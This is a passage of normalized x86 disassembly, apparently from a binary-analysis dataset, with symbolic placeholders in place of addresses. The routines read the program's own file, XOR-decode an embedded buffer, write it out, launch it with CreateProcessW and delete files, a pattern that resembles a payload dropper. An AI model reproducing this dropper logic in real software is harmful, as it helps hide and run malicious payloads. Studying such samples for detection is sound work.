call sub_410b96
cdq
mov ecx 0x96
idiv ecx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax 0x1
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov dl [ ebp - 0x8 ]
mov [ ecx + eax ] dl
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jge r-xdata
mov al 0x1
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx - 0x1 ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + ecx + 0x6 ]
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_40e020
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x20 ] ecx
push 0x8
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x20 ]
call sub_40df90
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x18 ]
mov cl [ eax ]
mov [ ebp - 0x11 ] cl
add [ ebp - 0x18 ] 0x1
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
cmp edx [ ebp - 0x24 ]
jge r-xdata
mov al 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
mov dl [ ebp + ecx - 0x10 ]
mov [ eax + rw-data ] dl
jmp r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
sub_40e0b0
push ebp
mov ebp esp
push 0xffffffff
push sub_41bffb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x294
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x27c ] ecx
mov eax 0x1
shl eax 0x3
add eax rw-data
mov [ ebp - 0x268 ] eax
mov ecx 0x1
imul ecx ecx 0xc
add ecx rw-data
mov [ ebp - 0x26c ] ecx
mov [ ebp - 0x264 ] 0x0
push 0x24c
push 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_412270
add esp 0xc
lea eax [ ebp - 0x264 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40b200
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x280 ] eax
cmp [ ebp - 0x280 ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x248 ]
imul ecx ecx 0x0
add ecx [ ebp - 0x244 ]
xor edx edx
mov [ ebp - 0x278 ] ecx
mov [ ebp - 0x274 ] edx
cmp [ ebp - 0x274 ] 0x0
jl r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x278 ]
mov ecx [ ebp - 0x268 ]
mov [ ecx ] eax
push 0x0
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x2a0 ]
push eax
mov ecx [ ebp - 0x27c ]
call sub_40d590
mov [ ebp - 0x284 ] eax
mov ecx [ ebp - 0x284 ]
mov [ ebp - 0x288 ] ecx
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x288 ]
push edx
lea ecx [ ebp - 0x11 ]
call sub_40c410
mov ecx [ ebp - 0x26c ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2a0 ]
call sub_40b0a0
mov edx [ ebp - 0x268 ]
cmp [ edx ] 0x0
je r-xdata
jg r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x270 ] 0x0
mov eax [ ebp - 0x26c ]
cmp [ eax ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x278 ] 0x7d000
jbe r-xdata
mov ecx [ ebp - 0x268 ]
cmp [ ecx ] 0x7d000
ja r-xdata
mov [ ebp - 0x270 ] 0x1
jmp r-xdata
mov al [ ebp - 0x270 ]
sub_40e260
push ebp
mov ebp esp
mov eax 0x1040
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1028 ] ecx
mov [ ebp - 0x100c ] 0x0
mov [ ebp - 0x101c ] 0x0
mov [ ebp - 0x1018 ] 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1040 ]
push ecx
mov ecx [ ebp - 0x1028 ]
call sub_40d590
mov [ ebp - 0x1024 ] eax
push r--data
mov ecx [ ebp - 0x1024 ]
call sub_40c470
push eax
call sub_410b0c
add esp 0x8
mov [ ebp - 0x100c ] eax
cmp [ ebp - 0x100c ] 0x0
je r-xdata
mov [ ebp - 0x1020 ] 0x0
mov [ ebp - 0x1020 ] 0x1
jmp r-xdata
xor al al
mov ecx [ ebp - 0x100c ]
push ecx
call sub_410b70
add esp 0x4
test eax eax
jne r-xdata
mov dl [ ebp - 0x1020 ]
mov [ ebp - 0x1005 ] dl
lea ecx [ ebp - 0x1040 ]
call sub_40b0a0
movzx eax [ ebp - 0x1005 ]
test eax eax
je r-xdata
push 0x0
call sub_40d540
add esp 0x4
push eax
call sub_410bb9
add esp 0x4
mov ecx [ ebp - 0x1018 ]
add ecx 0x10
mov [ ebp - 0x1014 ] ecx
jmp r-xdata
mov edx [ ebp - 0x100c ]
push edx
push 0x1000
push 0x1
lea eax [ ebp - 0x1004 ]
push eax
call sub_410169
add esp 0x10
mov [ ebp - 0x101c ] eax
mov [ ebp - 0x1010 ] 0x0
jmp r-xdata
cmp [ ebp - 0x1014 ] 0x7d000
jg r-xdata
mov edx [ ebp - 0x1010 ]
cmp edx [ ebp - 0x101c ]
jge r-xdata
mov edx [ ebp - 0x100c ]
push edx
call sub_410937
add esp 0x4
mov al 0x1
jmp r-xdata
call sub_410b96
and eax 0x800000ff
jns r-xdata
mov eax [ ebp - 0x1018 ]
add eax [ ebp - 0x101c ]
mov [ ebp - 0x1018 ] eax
jmp r-xdata
mov eax [ ebp - 0x1018 ]
add eax [ ebp - 0x1010 ]
mov ecx [ ebp - 0x1010 ]
mov dl [ ebp + ecx - 0x1004 ]
mov [ eax + rw-data ] dl
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x1014 ]
mov [ ecx + rw-data ] al
jmp r-xdata
dec eax
or eax 0xffffff00
inc eax
mov ecx [ ebp - 0x1010 ]
add ecx 0x1
mov [ ebp - 0x1010 ] ecx
mov edx [ ebp - 0x1014 ]
add edx 0x1
mov [ ebp - 0x1014 ] edx
sub_40e440
push ebp
mov ebp esp
mov eax 0x1140
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1128 ] ecx
mov [ ebp - 0x108 ] 0x0
push 0x103
push 0x0
lea eax [ ebp - 0x107 ]
push eax
call sub_412270
add esp 0xc
push 0x104
lea ecx [ ebp - 0x108 ]
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
mov [ ebp - 0x110c ] 0x0
mov [ ebp - 0x1118 ] 0x0
push r--data
lea edx [ ebp - 0x108 ]
push edx
call sub_410b0c
add esp 0x8
mov [ ebp - 0x110c ] eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1140 ]
push ecx
mov ecx [ ebp - 0x1128 ]
call sub_40d590
mov [ ebp - 0x1124 ] eax
push r--data
mov ecx [ ebp - 0x1124 ]
call sub_40c470
push eax
call sub_410b0c
add esp 0x8
mov [ ebp - 0x1118 ] eax
lea ecx [ ebp - 0x1140 ]
call sub_40b0a0
cmp [ ebp - 0x110c ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x1118 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x1110 ] 0x0
mov [ ebp - 0x111c ] 0x0
mov [ ebp - 0x1120 ] 0x0
mov ecx [ ebp - 0x110c ]
push ecx
call sub_410937
add esp 0x4
mov edx [ ebp - 0x1118 ]
push edx
call sub_410937
add esp 0x4
mov al 0x1
mov eax [ ebp - 0x110c ]
push eax
push 0x1000
push 0x1
lea ecx [ ebp - 0x1108 ]
push ecx
call sub_410169
add esp 0x10
mov [ ebp - 0x111c ] eax
mov [ ebp - 0x1114 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1114 ]
cmp eax [ ebp - 0x111c ]
jge r-xdata
mov ecx [ ebp - 0x1118 ]
push ecx
mov edx [ ebp - 0x111c ]
push edx
push 0x1
lea eax [ ebp - 0x1108 ]
push eax
call sub_41039b
add esp 0x10
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1110 ]
cmp edx [ ecx ]
jl r-xdata
mov edx [ ebp - 0x110c ]
push edx
call sub_410b70
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp - 0x1110 ]
add eax 0x1
mov [ ebp - 0x1110 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
add ecx 0x7d010
cmp [ ebp - 0x1110 ] ecx
jge r-xdata
mov edx [ ebp - 0x1114 ]
add edx 0x1
mov [ ebp - 0x1114 ] edx
mov edx [ ebp - 0x1114 ]
mov eax [ ebp - 0x1120 ]
mov cl [ eax + rw-data ]
mov [ ebp + edx - 0x1108 ] cl
mov edx [ ebp - 0x1120 ]
add edx 0x1
mov [ ebp - 0x1120 ] edx
sub_40e650
push ebp
mov ebp esp
push 0xffffffff
push sub_41bf86
mov eax [ fs : 0x0 ]
push eax
sub esp 0x250
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x238 ] ecx
xor eax eax
mov [ ebp - 0x218 ] ax
push 0x206
push 0x0
lea ecx [ ebp - 0x216 ]
push ecx
call sub_412270
add esp 0xc
push 0x104
lea edx [ ebp - 0x218 ]
push edx
push 0x0
call [ GetModuleFileNameW@IAT ]
mov [ ebp - 0x21c ] 0x0
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x25c ]
call sub_40b0f0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x21c ]
push ecx
lea edx [ ebp - 0x25c ]
push edx
mov ecx [ ebp - 0x238 ]
call sub_40da80
movzx eax al
test eax eax
jne r-xdata
mov [ ebp - 0x244 ] 0x0
mov [ ebp - 0x244 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x238 ]
call sub_40e020
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x238 ]
call sub_40e0b0
movzx ecx al
test ecx ecx
jne r-xdata
xor al al
jmp r-xdata
mov cl [ ebp - 0x244 ]
mov [ ebp - 0x23d ] cl
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x25c ]
call sub_40b130
movzx edx [ ebp - 0x23d ]
test edx edx
je r-xdata
lea edx [ ebp - 0x234 ]
push edx
mov ecx [ ebp - 0x238 ]
call sub_40d7a0
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
push eax
lea ecx [ ebp - 0x234 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x238 ]
call sub_40d8a0
movzx eax al
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebp - 0x234 ]
push ecx
mov ecx [ ebp - 0x238 ]
call sub_40e260
movzx edx al
test edx edx
jne r-xdata
lea ecx [ ebp - 0x234 ]
call sub_40b200
push eax
call [ DeleteFileW@IAT ]
mov [ ebp - 0x239 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40b130
mov al [ ebp - 0x239 ]
jmp r-xdata
lea ecx [ ebp - 0x234 ]
call sub_40b200
push eax
call [ DeleteFileW@IAT ]
lea eax [ ebp - 0x21c ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x238 ]
call sub_40e440
movzx edx al
test edx edx
jne r-xdata
lea ecx [ ebp - 0x234 ]
call sub_40b200
push eax
call [ DeleteFileW@IAT ]
mov [ ebp - 0x23b ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40b130
mov al [ ebp - 0x23b ]
jmp r-xdata
mov [ ebp - 0x23a ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40b130
mov al [ ebp - 0x23a ]
mov [ ebp - 0x23c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40b130
mov al [ ebp - 0x23c ]
jmp r-xdata
sub_40e8b0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] 0x7d010
jge r-xdata
mov al 0x1
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + rw-data ]
test edx edx
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + rw-data ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
movzx eax [ edx + rw-data ]
xor eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + rw-data ] al
sub_40e920
push ebp
mov ebp esp
push 0xffffffff
push sub_41bf3b
mov eax [ fs : 0x0 ]
push eax
mov eax 0x12cc
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x1284 ] ecx
mov eax 0x1
shl eax 0x3
add eax rw-data
mov [ ebp - 0x127c ] eax
mov ecx 0x1
imul ecx ecx 0xc
add ecx rw-data
mov [ ebp - 0x1288 ] ecx
mov edx [ ebp - 0x127c ]
cmp [ edx ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x1288 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x1270 ] 0x0
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x12c0 ]
push edx
mov ecx [ ebp - 0x1284 ]
call sub_40d590
mov [ ebp - 0x12a4 ] eax
push r--data
mov ecx [ ebp - 0x12a4 ]
call sub_40c470
push eax
call sub_410b0c
add esp 0x8
mov [ ebp - 0x1270 ] eax
lea ecx [ ebp - 0x12c0 ]
call sub_40b0a0
cmp [ ebp - 0x1270 ] 0x0
jne r-xdata
mov [ ebp - 0x1268 ] 0x0
mov [ ebp - 0x1278 ] 0x0
mov [ ebp - 0x1274 ] 0x10
jmp r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x1274 ] 0x7d010
jge r-xdata
cmp [ ebp - 0x1268 ] 0x0
je r-xdata
mov ecx [ ebp - 0x1268 ]
mov edx [ ebp - 0x1274 ]
mov al [ edx + rw-data ]
mov [ ebp + ecx - 0x1010 ] al
mov ecx [ ebp - 0x1268 ]
add ecx 0x1
mov [ ebp - 0x1268 ] ecx
mov edx [ ebp - 0x1278 ]
add edx 0x1
mov [ ebp - 0x1278 ] edx
cmp [ ebp - 0x1268 ] 0x1000
jne r-xdata
mov edx [ ebp - 0x1270 ]
push edx
call sub_410937
add esp 0x4
mov [ ebp - 0x1264 ] 0x0
push 0x24c
push 0x0
lea eax [ ebp - 0x1260 ]
push eax
call sub_412270
add esp 0xc
lea ecx [ ebp - 0x1264 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40b200
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x12a8 ] eax
cmp [ ebp - 0x12a8 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1270 ]
push edx
mov eax [ ebp - 0x1268 ]
push eax
push 0x1
lea ecx [ ebp - 0x1010 ]
push ecx
call sub_41039b
add esp 0x10
mov eax [ ebp - 0x127c ]
mov ecx [ ebp - 0x1278 ]
cmp ecx [ eax ]
jne r-xdata
mov eax [ ebp - 0x1270 ]
push eax
mov ecx [ ebp - 0x1268 ]
push ecx
push 0x1
lea edx [ ebp - 0x1010 ]
push edx
call sub_41039b
add esp 0x10
mov [ ebp - 0x1268 ] 0x0
mov edx [ ebp - 0x1248 ]
imul edx edx 0x0
add edx [ ebp - 0x1244 ]
xor eax eax
mov [ ebp - 0x1298 ] edx
mov [ ebp - 0x1294 ] eax
mov ecx [ ebp - 0x127c ]
mov edx [ ecx ]
xor eax eax
mov [ ebp - 0x1290 ] edx
mov [ ebp - 0x128c ] eax
mov ecx [ ebp - 0x1290 ]
cmp ecx [ ebp - 0x1298 ]
jne r-xdata
xor al al
jmp r-xdata
jmp r-xdata
jmp r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x128c ]
cmp edx [ ebp - 0x1294 ]
je r-xdata
mov eax [ ebp - 0x1274 ]
add eax 0x1
mov [ ebp - 0x1274 ] eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x12d8 ]
push ecx
mov ecx [ ebp - 0x1284 ]
call sub_40d590
mov [ ebp - 0x129c ] eax
mov edx [ ebp - 0x129c ]
mov [ ebp - 0x12a0 ] edx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x12a0 ]
push eax
lea ecx [ ebp - 0x1011 ]
call sub_40c410
mov ecx [ ebp - 0x1288 ]
cmp [ ecx ] eax
je r-xdata
mov [ ebp - 0x1280 ] 0x0
mov [ ebp - 0x1280 ] 0x1
jmp r-xdata
mov al 0x1
xor al al
jmp r-xdata
mov dl [ ebp - 0x1280 ]
mov [ ebp - 0x1269 ] dl
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x12d8 ]
call sub_40b0a0
movzx eax [ ebp - 0x1269 ]
test eax eax
je r-xdata
sub_40ec50
push ebp
mov ebp esp
push 0xffffffff
push sub_41bfbb
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x6c ] 0x44
push 0x40
push 0x0
lea eax [ ebp - 0x68 ]
push eax
call sub_412270
add esp 0xc
mov [ ebp - 0x40 ] 0x1
xor ecx ecx
mov [ ebp - 0x3c ] cx
push r--data
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0xac ]
push eax
call sub_40f330
add esp 0xc
mov [ ebp - 0x8c ] eax
mov ecx [ ebp - 0x8c ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
call sub_40f3f0
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xac ]
call sub_40b130
lea edx [ ebp - 0x7c ]
push edx
lea eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x28 ]
call sub_40b200
push eax
push 0x0
call [ CreateProcessW@IAT ]
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x88 ] 0x0
je r-xdata
mov [ ebp - 0x84 ] 0x0
mov [ ebp - 0x84 ] 0x1
jmp r-xdata
mov cl [ ebp - 0x84 ]
mov [ ebp - 0x7d ] cl
lea ecx [ ebp - 0x28 ]
call sub_40b130
mov al [ ebp - 0x7d ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x8
sub_40ed80
push ebp
mov ebp esp
push 0xffffffff
push sub_41bf01
mov eax [ fs : 0x0 ]
push eax
sub esp 0x274
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x240 ] ecx
mov [ ebp - 0x21c ] 0x0
lea eax [ ebp - 0x21c ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x240 ]
call sub_40da80
movzx edx al
test edx edx
jne r-xdata
lea eax [ ebp - 0x21c ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x240 ]
call sub_40ddb0
mov edx [ rw-data ]
push edx
mov ecx [ ebp - 0x240 ]
call sub_40e8b0
lea eax [ ebp - 0x234 ]
push eax
mov ecx [ ebp - 0x240 ]
call sub_40d7a0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x234 ]
call sub_40b200
push eax
call [ DeleteFileW@IAT ]
lea ecx [ ebp - 0x234 ]
push ecx
mov ecx [ ebp - 0x240 ]
call sub_40e920
movzx edx al
test edx edx
jne r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp + 0xc ]
call sub_40b200
push eax
lea ecx [ ebp - 0x234 ]
call sub_40b200
push eax
call sub_405f10
add esp 0x8
mov [ ebp - 0x250 ] eax
lea ecx [ ebp - 0x234 ]
call sub_40b200
push eax
call [ DeleteFileW@IAT ]
cmp [ ebp - 0x250 ] 0x0
je r-xdata
lea ecx [ ebp - 0x234 ]
call sub_40b200
push eax
call [ DeleteFileW@IAT ]
mov [ ebp - 0x237 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40b130
mov al [ ebp - 0x237 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov [ ebp - 0x218 ] ax
push 0x206
push 0x0
lea ecx [ ebp - 0x216 ]
push ecx
call sub_412270
add esp 0xc
mov ecx [ ebp + 0xc ]
call sub_40b280
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x244 ] 0x0
jmp r-xdata
mov [ ebp - 0x236 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40b130
mov al [ ebp - 0x236 ]
jmp r-xdata
mov eax [ ebp - 0x244 ]
cmp eax [ ebp - 0x24c ]
jge r-xdata
push r--data
lea ecx [ ebp - 0x218 ]
push ecx
call [ PathAppendW@IAT ]
movzx edx [ ebp + 0x10 ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x244 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_40ca50
mov edx [ ebp - 0x244 ]
mov ax [ eax ]
mov [ ebp + edx * 2 - 0x218 ] ax
jmp r-xdata
mov [ ebp - 0x235 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40b130
mov al [ ebp - 0x235 ]
push r--data
lea ecx [ ebp - 0x280 ]
call sub_40b0f0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x268 ]
call sub_40b0f0
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x280 ]
push ecx
lea edx [ ebp - 0x268 ]
push edx
mov ecx [ ebp - 0x240 ]
call sub_40ec50
movzx eax al
test eax eax
jne r-xdata
mov edx [ ebp - 0x244 ]
add edx 0x1
mov [ ebp - 0x244 ] edx
mov [ ebp - 0x248 ] 0x0
mov [ ebp - 0x248 ] 0x1
jmp r-xdata
mov [ ebp - 0x238 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40b130
mov al [ ebp - 0x238 ]
jmp r-xdata
mov cl [ ebp - 0x248 ]
mov [ ebp - 0x239 ] cl
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x268 ]
call sub_40b130
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x280 ]
call sub_40b130
movzx edx [ ebp - 0x239 ]
test edx edx
je r-xdata
sub_40f070
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_40b340
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b350
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_40b2a0
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40f0a0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40b370
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b350
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_40b2a0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c1b0
add esp 0x4
push eax
mov ecx [ ebp - 0x8 ]
call sub_40f1a0
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40f130
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40b370
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b350
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_40b520
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c1b0
add esp 0x4
push eax
mov ecx [ ebp - 0x8 ]
call sub_40ca70
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40f1a0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x10
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_40b370
mov ecx eax
call sub_40c160
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
add edx 0x1
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call sub_40ab40
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov [ eax + 0x14 ] edx
push 0x0
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_40b2a0
mov esp ebp
pop ebp
retn 0x4
sub_40f220
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x10 ]
ja r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
sub edx [ ecx + 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40f260
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b6a0
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_40f260
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ r--data ]
sub ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b970
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b880
movzx edx al
test edx edx
je r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40f2e0
mov ecx [ ebp - 0x8 ]
push ecx
